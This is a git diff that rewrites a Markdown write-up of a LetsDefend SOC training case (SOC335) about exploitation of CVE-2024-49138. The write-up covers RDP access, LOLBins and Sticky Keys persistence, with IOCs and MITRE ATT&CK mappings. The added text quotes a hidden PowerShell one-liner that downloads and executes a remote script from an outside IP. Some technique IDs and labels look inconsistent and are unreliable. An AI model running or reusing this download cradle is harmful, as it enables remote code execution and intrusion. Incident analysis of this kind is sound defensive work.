@@ -1,78 +1,80 @@
-# 🛡️ LetsDefend Case #1: CVE-2024-49138 - Sticky Keys Abuse via LOLBins
+# 👨‍💻 LetsDefend Case Study #1: CVE-2024-49138 Exploitation (SOC335) — LOLBins, RDP and Sticky Keys Abuse
 
-## 🔍 Summary
+## 🚨 Incident Overview
+This is the first case study from **LetsDefend**, where we investigate the exploitation of **CVE-2024-49138**. The incident was triggered due to suspicious behavior patterns indicating the possible exploitation of the vulnerability. The core of the exploitation involved **Remote Desktop Protocol (RDP)** access, **Living Off the Land Binaries (LOLbins)**, and abuse of the **Sticky Keys backdoor** technique for persistence.
 
-This case involves detecting an attacker leveraging a Windows LOLBin (`Sethc.exe`) to establish persistence through Sticky Keys backdoor abuse. It ties into CVE-2024-49138 and involves Remote Desktop Protocol (RDP) access, privilege escalation, and potential lateral movement.
+### 🚨 Incident Details
+- **Suspicious Process**: `svohost.exe` (suspiciously similar to `svchost.exe`, a common process targeted by attackers to disguise malicious processes)
+- **Parent Process Path**: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
+- **Exploitation Trigger**: Unusual behavior patterns associated with the hash, suggesting a **CVE-2024-49138** exploitation attempt.
 
----
+### 🚨 Key Investigation Findings
+- The attacker used **PowerShell** to execute the following command:
+    ```powershell
+    "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy Bypass -NoP -W Hidden -C IEX(New-Object Net.WebClient).DownloadString('http://18.223.186.129:4444/MBS.ps1')
+    ```
+- **RDP Connection**: The attacker successfully connected to the host with IP `172.16.17.207` using **RDP** over Port `3389`.
+- **Sticky Keys Abuse**: The attacker used the **Sticky Keys backdoor technique** as a persistence mechanism by replacing `sethc.exe` with the following command:
+    ```powershell
+    C:\Windows\System32\Sethc.exe /AccessibilitySoundAgent
+    ```
+- The attacker downloaded a ZIP file (`service-installer.zip`) and extracted it using the password **infected**, which contained the malware `svohost.exe`.
+- A failed authentication attempt was made to gain **admin** access, which failed due to invalid credentials (`0xC000006D` error).
 
-## 🚨 Initial Alert Details
+### 🚨 Attack Steps & Techniques
+The attacker utilized the following techniques in line with the **MITRE ATT&CK framework**:
 
-- **Alert:** PowerShell - Suspicious CommandLine
-- **Source IP:** 10.10.20.11
-- **Detected Command:**
-  ```powershell
-  C:\Windows\System32\Sethc.exe /AccessibilitySoundAgent
-  ```
-- **Tool:** LetsDefend SOC Simulation (SOC335)
-- **Time:** [Exact time not listed; assumed during case engagement]
+| **Step** | **Tactic** | **Technique** |
+|----------|------------|---------------|
+| 1. RDP login | Initial Access | T1133 |
+| 2. PowerShell execution | Execution | T1059.001 |
+| 3. Admin priv. check | Discovery / Priv. Esc | T1033 / T1068 |
+| 4. Sticky Keys backdoor | Persistence | T1547.008 |
+| 5. Defender bypass | Defense Evasion | T1562.001 |
+| 6. Lateral RDP | Lateral Movement | T1021.001 |
+| 7. Payload staging | Command & Control | T1105 |
+| 8. Tool execution | Execution | T1059.001 |
+| 9. LOLBin usage | Defense Evasion | T1218.001 |
 
----
+### 🚨 Key Indicators of Compromise (IOCs)
+- **Malicious Executable**: `svohost.exe`
+- **External IP**: `185.107.56.141`
+- **Malicious URL**: `http://18.223.186.129:4444/MBS.ps1`
+- **Ports**: `3389` (RDP)
+- **ZIP File Downloaded**: `service-installer.zip`
+- **Password for ZIP**: `infected`
 
-## 🧪 Investigation Timeline
+### 🚨 Why is this a Remote Code Execution (RCE)?
+The attacker is executing code from a remote source (`MBS.ps1`), which constitutes a **Remote Code Execution (RCE)**, even though a local binary (e.g., **PowerShell**) is used to execute it.
 
-1. **RDP Logon Activity:**
-   - Login from 10.10.20.11 observed on target host.
-   - Indicates successful remote access and credential use.
-
-2. **Suspicious Command Execution:**
-   - Execution of `Sethc.exe` with unusual parameters.
-   - Suggests hijack of the Sticky Keys feature for persistence.
-
-3. **Malicious Registry Modification (Likely):**
-   - Although not shown in raw logs, this behavior commonly involves:
-     ```
-     HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe
-     ```
-     to redirect execution or run a custom command.
-
-4. **TTPs Mapped:**
-   - `T1546.008` — Accessibility Features (Persistence)
-   - `T1218` — Signed Binary Proxy Execution (LOLBins)
-   - `T1021.001` — Remote Services: RDP
-   - `T1053.005` — Scheduled Task/Job: Scheduled Task (if used)
-   - `T1036` — Masquerading
-
----
-
-## 🧠 Analysis Notes
-
-- Sticky Keys (`sethc.exe`) is a known LOLBin.
-- Modifying its behavior allows attackers to launch commands from the login screen.
-- This attack may not be malware-based, but rather abuses built-in binaries.
-- Endpoint logging with Sysmon or EDR is critical to detecting such actions.
-
----
-
-## 🧰 Artifacts Included
-
-- `sysmon_logs.txt`: (placeholder) Command execution events
-- `scheduled_task.xml`: (placeholder) Possible scheduled task creation
-- Screenshots can be added here to enhance investigation transparency.
+### 🚨 Incident Response Actions
+- **Containment**: The first step was containment of the affected host.
+- **Mitigation**: Actions included identifying the attacker’s methods, stopping RDP access, disabling the Sticky Keys backdoor, and scanning for other potential IOCs.
 
 ---
 
-## 🛡️ Recommendations
-
-- Monitor usage of `sethc.exe` or similar accessibility tools from unexpected contexts.
-- Audit registry keys under Image File Execution Options regularly.
-- Restrict unnecessary RDP access; enforce MFA and lockout policies.
-- Disable accessibility features if not in use on endpoints.
+## 📚 MITRE ATT&CK Mapping
+This case study is closely related to several tactics and techniques outlined in the **MITRE ATT&CK framework**, and the incident can be mapped to the following:
+- **Initial Access**: RDP login (T1133)
+- **Execution**: PowerShell abuse (T1059.001)
+- **Persistence**: Sticky Keys backdoor (T1547.008)
+- **Defense Evasion**: PowerShell with `-ExecutionPolicy Bypass` (T1562.001)
+- **Command and Control**: Payload staging (T1105)
+- **Lateral Movement**: RDP lateral movement (T1021.001)
+- **Credential Dumping**: Admin priv. check (T1033 / T1068)
 
 ---
 
-## 📚 References
+## 🧪 Key Takeaways
+This incident highlights the use of common, trusted system binaries (**PowerShell**, **Sticky Keys**) to bypass detection mechanisms and escalate privileges. Additionally, it emphasizes the importance of monitoring **RDP** access and securing system services to prevent lateral movement and persistence mechanisms.
 
-- [CVE-2024-49138](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-49138)
-- [MITRE ATT&CK T1546.008 - Accessibility Features](https://attack.mitre.org/techniques/T1546/008/)
-- [LetsDefend Blog Post (Author)](https://myitjourney12.wordpress.com/2025/04/15/letsdefend-case-1-soc335-cve-2024-49138-exploitation-detected-lolbin-and-rce/)
+---
+
+## 💡 Conclusion
+This case study provides a great example of the need for vigilance in detecting **RDP** abuse, **PowerShell** exploitation, and **local persistence techniques** like Sticky Keys. The attacker used **Living Off the Land Binaries (LOLbins)** and sophisticated **defense evasion** tactics to carry out the attack stealthily.
+
+---
+
+## 🔗 Links
+- [LetsDefend Case Study #1](https://myitjourney12.wordpress.com/2025/04/15/letsdefend-case-1-soc335-cve-2024-49138-exploitation-detected-lolbin-and-rce/)
+- [GitHub Repository](https://github.com/BNarlioglu/LetsDefend-Investigations)
